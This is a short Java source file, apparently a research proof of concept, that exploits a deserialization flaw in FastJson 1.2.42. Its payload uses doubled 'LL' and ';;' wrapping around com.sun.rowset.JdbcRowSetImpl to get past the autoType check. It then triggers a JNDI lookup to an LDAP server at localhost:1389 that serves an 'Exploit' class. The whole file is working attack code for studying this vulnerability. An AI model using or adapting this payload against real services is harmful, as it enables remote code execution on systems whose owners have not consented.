package com.jemmy.serialize.leak;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.ParserConfig;

/**
 * FastJson 1.2.42
 * jdk8u181
 *
 * 前后双写LL和;;来绕过checkAutotype
 *
 * @author zhujiang.cheng
 * @since 2020/6/3
 */
public class JdbcRowSetLLAttack {

    public static void main(String[] args) {
        String payload = "{\"rand1\":{\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"ldap://localhost:1389/Exploit\",\"autoCommit\":true}}";
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        JSONObject jsonObject = JSON.parseObject(payload);
        System.out.println(jsonObject);
    }

}
